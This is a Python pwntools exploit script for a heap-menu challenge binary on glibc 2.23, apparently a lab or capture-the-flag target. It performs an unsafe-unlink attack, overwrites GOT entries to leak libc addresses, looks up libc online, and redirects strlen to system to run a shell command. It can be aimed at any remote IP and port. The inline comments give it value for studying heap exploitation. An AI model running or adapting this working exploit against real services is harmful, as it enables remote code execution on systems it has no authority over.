from pwn import *
import argparse
import tempfile
from pwnc import get_libc
from pwnc import pwnc_exceptions

context.terminal = ["xterm", "-e"]
context.aslr = False
binary_name = "./chapter1"
libc_path = "./glibc-2.23/libc.so.6"
context.binary = binary_name
elf = context.binary

MENU_END = b">> "

gdb_script = f"""
    dir ~/Development/glibc/
    file {binary_name}
    set $chunks = 0x6020c0
    continue
"""

def allocate(size, data):
    r.sendline(b"1")
    r.sendlineafter(b"Size: ", str(size).encode())
    r.sendlineafter(b"Data: ", data)
    r.recvuntil(MENU_END)

def edit(index, data, skip_recv=False):
    r.sendline(b"2")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Data: ", data)
    if(skip_recv):
        return None
    r.recvuntil(MENU_END)

def delete(index, skip_recv=False):
    r.sendline(b"3")
    r.sendlineafter(b"Index: ", str(index).encode())
    if(skip_recv):
        return
    return r.recvuntil(MENU_END)

r = None
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", help="remote ip", type=str, required=False, 
                        default="172.17.0.2")
    parser.add_argument("--port", help="remote port", type=int, required=False, 
                        default=4444)
    parser.add_argument("--debug", help="shows more verbose output", 
                        required=False, action="store_true", default=False)
    parser.add_argument("--pause", help="pause on start. Makes it easier to attach a debugger", 
                        action="store_true", default=False, required=False)
    parser.add_argument("--live", help="throw at the IP/port args provided to this program", 
                        action="store_true", default=False)
    parser.add_argument("--gdb", "-g", default=False, action="store_true",
                        help="launch a gdb terminal")
    parser.add_argument("--command", "-c", default="/bin/sh", type=str,
                        help="command to execute on target")
    args = parser.parse_args()

    if(args.debug):
        context.log_level = "debug"

    global r
    if(args.live):
        if(not args.debug):
            log.warn("Requires debug mode for remote exploitation. Enabling.")
            context.log_level = "debug"
        r = remote(args.ip, args.port)
    else:
        r = process(binary_name)

    if(args.pause):
        pause()

    if(args.gdb):
        gdb.attach(r, gdb_script)

    r.recvuntil(MENU_END)

    # important sizes
    size = 0xc8
    large = 0x418

    # important indexes
    launch_index = 3
    victim_index = 4
   
    # allocate 5 chunks
    allocate(size, b"B")            # 0
    allocate(size, b"B")            # 1
    allocate(size, b"B")            # 2
    allocate(size, size*b"A")       # 3
    allocate(size, b"B")            # 4

    # craft a smaller chunk whos metadata starts at our data. This smaller 
    # chunk will reside inside of index launch_index and will be "created" once
    # index victim_index is free'd.
    payload = p64(0) # prev_size
    payload += p64(size-0x10+9) # size + PREV_IN_USE
    payload += p64(0x6020c0) # fd
    payload += p64(0x6020c8) # bk
    payload += (size - len(payload) - 8)*b"C"
    payload += p64(size - 8)

    # setting victim_index prev_size to not have PREV_IN_USE
    payload += (size + 8 & 0xff).to_bytes(1, "little")
    edit(launch_index, payload)

    # We changed PREV_IN_USE for prev_size so that it was NOT set. This causes
    # free to coalesce the two chunks together. Since the prev_size field is
    # smaller free will use the fake metadata that we crafted. The checks that
    # we must pass are
    # fd->bk == p
    # bk->fd == p
    # in our case we have setup the chunk list such that victim_index of the
    # chunk list holds our pointer that is being free'd. We set our fd pointer
    # to the chunk list (0x18 before victim_index) and we setup our bk pointer
    # to the chunk list (0x10 before victim_index). This allows us to pass the
    # previously mentioned checks. Recall the metadata of a free chunk
    # prev_size                 | chunk index 0
    # size (offset 8)           | chunk index 1
    # fd (offset 0x10)          | chunk index 2
    # bk (offset 0x18)          | chunk index 3 OUR CHUNK ADDRESS IS HERE
    delete(victim_index)

    # passing all of the previously mentioned checks means that free makes the
    # following writes
    # fd->bk = bk               | chunk index 3 = addr of chunk index 1
    # bk->fd = fd               | chunk index 3 = addr of chunk index 0
    # this means we will be able to directly edit the contents of the chunk 
    # list by editing chunk #3
   
    # next we use our new powers to edit the global offset table. We change the
    # address for free@got to puts@plt. This means that when free@plt is called
    # it will load the address of free@got which is now puts@plt. Puts@plt 
    # loads the true address of puts in libc by referencing puts@got. This 
    # tricka allows us to call puts on any address that we call free on. Since
    # we can control the value of the pointer at index 0 of our chunk list we
    # can effectively leak the value that a pointer points to.
    edit(3, p64(elf.got.free))
    edit(0, p64(elf.plt.puts))

    # the steps are:
    #   1. change the index 0 pointer to the pointer you want to leak
    edit(3, p64(elf.got.puts))
   
    #   2. call delete on index 0 which sends that pointer to free. Reference
    #      free calling puts logic explained above.
    data = (delete(0)).split(b"Done")[0]
    if(b"\r\n" in data):
        data = data.split(b"\r\n")[1]
    puts_addr = u64(data.ljust(8, b"\0"))

    log.info(f"Found puts@libc: {hex(puts_addr)}")

    # do the leak again for the address of read
    allocate(size, b"a")
    edit(3, p64(elf.got.read))

    data = (delete(0)).split(b"Done")[0]
    if(b"\r\n" in data):
        data = data.split(b"\r\n")[1]
    read_addr = u64(data.ljust(8, b"\0"))

    log.info(f"Found read@libc: {hex(read_addr)}")

    # only use pwnc on the remote target because the locally build libc is not
    # documented in the libc.rip database.

    libc = None
    if(args.live):
        log.info(f"Using pwnc to get libc with known addresses")
        log.info(f"read@libc   = {hex(read_addr)}")
        log.info(f"puts@libc = {hex(puts_addr)}")
        known_addrs = {"read": read_addr, "puts": puts_addr}
        try:
            libc_bytes = get_libc(known_addrs)
        except pwnc_exceptions.PWNCResponseError as e:
            log.warn("Could not download libc. Failing.")
            return 1

        with tempfile.NamedTemporaryFile() as fd:
            fd.write(libc_bytes)
            libc = ELF(fd.name, checksec=False)
    else:
        libc = ELF(libc_path, checksec=False)

    # re-base libc
    libc.address = read_addr - libc.sym.read

    log.info(f"Downloaded libc and based: {hex(libc.address)}")

    # allocate to fill in index 0 again
    allocate(size, b"A")

    # allocate a chunk that contains our desired command
    allocate(size, args.command.encode())

    # we will not use our powers to edit strlen@got to make it point to the
    # address of system in libc
    edit(3, p64(elf.got.strlen))

    # because of pty on target we have to escape the \x7f because thats 
    # backspace. use escape char \x16
    payload = p64(libc.sym.system)

    # live means remote which is probably pty enabled target
    if(args.live):
        payload = payload.replace(b"\x7f", b"\x16\x7f")

    # edit strlen@got to write system@libc
    edit(0, payload)

    # trigger an edit of chunk containing command. This triggers a call to
    # strlen(chunk_address) which actually calls system(chunk_address)
    r.sendline(b"2")
    r.sendlineafter(b"Index: ", b"4")

    r.interactive() 
    return 0 

if __name__ == "__main__":
    return_code = main()
    if(return_code == 1):
        log.error("Exploit failed.")
    elif(return_code == 0):
        log.success("Win!")
    else:
        log.warn("Bad return code.")


